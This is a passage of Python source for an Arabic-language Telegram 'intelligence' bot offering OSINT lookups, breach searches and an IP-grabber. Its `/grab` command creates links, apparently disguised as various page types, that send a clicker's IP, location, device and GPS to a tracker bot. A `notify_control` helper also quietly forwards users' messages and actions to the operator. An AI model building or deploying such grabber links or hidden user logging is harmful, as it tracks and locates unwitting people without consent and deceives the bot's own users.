        "ستصلك تفاصيل كاملة: IP، الموقع، الجهاز، GPS."
    ),
    "cb_mylogs": (
        "📋 *سجلاتي*\n\n"
        "الأمر: `/mylogs`\n\n"
        "يعرض جميع روابط سحب IP التي أنشأتها."
    ),
    "cb_dehashed": (
        "🔓 *فحص التسريبات — للمدير فقط*\n\n"
        "الأمر: `/dehashed <استعلام>`\n\n"
        "مثال:\n`/dehashed email@example.com`"
    ),
    "cb_vt": (
        "🔬 *VirusTotal — للمدير فقط*\n\n"
        "الأمر: `/vt <رابط>`\n\n"
        "فحص متقدم عبر محركات VirusTotal."
    ),
    "cb_help": None,
}


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user  = query.from_user
    await query.answer()
    data  = query.data

    if data == "cb_help":
        is_admin = user.id == ADMIN_ID
        text = (
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "📖 *قائمة الأوامر — راشد*\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "/start — تشغيل النظام\n"
            "/osint `<موضوع>` — بحث OSINT\n"
            "/user `<معرف>` — بحث مستخدم\n"
            "/ip `<عنوان>` — تحليل IP\n"
            "/scan `<رابط>` — فحص رابط\n"
            "/grab `<تسمية>` — رابط سحب IP\n"
            "/mylogs — سجلاتي\n"
            "/clear — مسح ذاكرة المحادثة\n"
            "/help — المساعدة\n"
        )
        if is_admin:
            text += "\n🔐 *للمدير:*\n/dehashed — تسريبات\n/vt — VirusTotal\n"
        text += "━━━━━━━━━━━━━━━━━━━━━\n✦ راشد — تطوير أبو سعود"
        back_kb = InlineKeyboardMarkup([[InlineKeyboardButton("↩️ رجوع", callback_data="cb_back")]])
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_kb)
        return

    if data == "cb_back":
        is_admin = user.id == ADMIN_ID
        await query.edit_message_text(
            WELCOME_TEXT.format(name=user.first_name),
            reply_markup=build_main_keyboard(is_admin),
            parse_mode="Markdown",
        )
        return

    if data == "cb_grab":
        grab_text = (
            "🕵️ *رابط سحب IP*\n\n"
            "الأمر: `/grab <تسمية>`\n\n"
            "مثال:\n`/grab رابط موقعي`\n\n"
            "ينشئ رابطاً خاصاً، عند ضغط أي شخص عليه\n"
            "ستصلك تفاصيل كاملة: IP، الموقع، الجهاز، GPS.\n\n"
            "⚠️ *يجب بدء بوت التعقب أولاً لاستقبال النتائج!*"
        )
        grab_kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("📩 ابدأ بوت التعقب", url="https://t.me/Rashd_IP_Tracker_bot?start=start")],
            [InlineKeyboardButton("↩️ رجوع", callback_data="cb_back")],
        ])
        await query.edit_message_text(grab_text, parse_mode="Markdown", reply_markup=grab_kb)
        return

    if data.startswith("grabpage:"):
        page_type = data.split(":", 1)[1]
        label = pending_grabs.pop(user.id, None)
        if not label:
            await query.edit_message_text("⛔ انتهت صلاحية الطلب. استخدم `/grab <تسمية>` مجدداً.", parse_mode="Markdown")
            return
        tracker_url = generate_grab_link(user.id, label, page_type)
        if tracker_url.startswith("⛔"):
            await query.edit_message_text(tracker_url)
            return
        page_name = PAGE_TYPES.get(page_type, page_type)
        text = (
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "🕵️ *راشد — رابط سحب IP*\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"🏷️ التسمية : `{label}`\n"
            f"🖼️ نوع الصفحة: {page_name}\n\n"
            f"🔗 *الرابط:*\n`{tracker_url}`\n\n"
            "📌 عندما يضغط أي شخص على الرابط\n"
            "ستصلك التقارير على *بوت التعقب* مباشرةً.\n\n"
            "⚠️ *مهم:* يجب أن تبدأ بوت التعقب أولاً\n"
            "ليتمكن من إرسال النتائج لك! 👇\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "✦ راشد — تطوير أبو سعود"
        )
        grab_kb = InlineKeyboardMarkup([[
            InlineKeyboardButton("📩 ابدأ بوت التعقب", url="https://t.me/Rashd_IP_Tracker_bot?start=start")
        ]])
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=grab_kb)
        if user.id != ADMIN_ID:
            notify_control(user, f"رابط سحب ({page_name}): {label}")
        return

    response = BUTTON_RESPONSES.get(data)
    if response:
        back_kb = InlineKeyboardMarkup([[InlineKeyboardButton("↩️ رجوع", callback_data="cb_back")]])
        await query.edit_message_text(response, parse_mode="Markdown", reply_markup=back_kb)
        if user.id != ADMIN_ID:
            notify_control(user, f"ضغط على زر: {data}")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  💬  معالج الرسائل النصية
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def is_code_block(text: str) -> bool:
    code_patterns = [
        r"```[\s\S]+```",
        r"def\s+\w+\s*\(",
        r"function\s+\w+\s*\(",
        r"import\s+\w+",
        r"#include\s*<",
        r"class\s+\w+",
        r"SELECT\s+.+FROM",
    ]
    return any(re.search(p, text, re.IGNORECASE) for p in code_patterns)


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.effective_user:
        return
    user     = update.effective_user
    user_msg = update.message.text or ""

    if not user_msg.strip():
        return

    if user.id != ADMIN_ID:
        notify_control(user, f"رسالة: {user_msg[:80]}")

    typing_msg = await update.message.reply_text("⏳ جاري المعالجة...")

    if is_code_block(user_msg):
        reply = analyze_code(user_msg)
    else:
        reply = ask_groq(user.id, user_msg)

    await typing_msg.delete()
    await update.message.reply_text(reply, parse_mode="Markdown")


async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user    = update.effective_user
    caption = update.message.caption or "صف ما تراه في الصورة بالتفصيل"
    msg     = await update.message.reply_text("🖼️ جاري تحليل الصورة...")
    photo   = update.message.photo[-1]
    file    = await context.bot.get_file(photo.file_id)
    img_bytes = bytes(await file.download_as_bytearray())
    result  = analyze_image_groq(img_bytes, caption)
    await msg.edit_text(result, parse_mode="Markdown")
    if user.id != ADMIN_ID:
        notify_control(user, "أرسل صورة للتحليل")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🚀  تشغيل البوت
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def main():
    app = Application.builder().token(MAIN_BOT_TOKEN).build()

    app.add_handler(CommandHandler("start",    cmd_start))
    app.add_handler(CommandHandler("help",     cmd_help))
    app.add_handler(CommandHandler("osint",    cmd_osint))
    app.add_handler(CommandHandler("user",     cmd_user))
    app.add_handler(CommandHandler("ip",       cmd_ip))
    app.add_handler(CommandHandler("scan",     cmd_scan))
    app.add_handler(CommandHandler("grab",     cmd_grab))
    app.add_handler(CommandHandler("mylogs",   cmd_mylogs))
    app.add_handler(CommandHandler("clear",    cmd_clear))
    app.add_handler(CommandHandler("dehashed", cmd_dehashed))
    app.add_handler(CommandHandler("vt",       cmd_vt))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(f"⚡ راشد الاستخباراتي v2.0 — يعمل الآن")
    print(f"🤖 البوت: {MAIN_BOT_TOKEN.split(':')[0]}")
    print(f"🌐 الخادم: {BOT_SERVER_URL}")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

    return app  


import threading
from flask import Flask
import os

app_web = Flask(__name__)

@app_web.route('/')
def home():
    return "Bot is running"

def run_web():
    port = int(os.environ.get("PORT", 10000))
    app_web.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

def run_bot():
    bot_app = main()
    bot_app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    threading.Thread(target=run_web, daemon=True).start()
    run_bot()
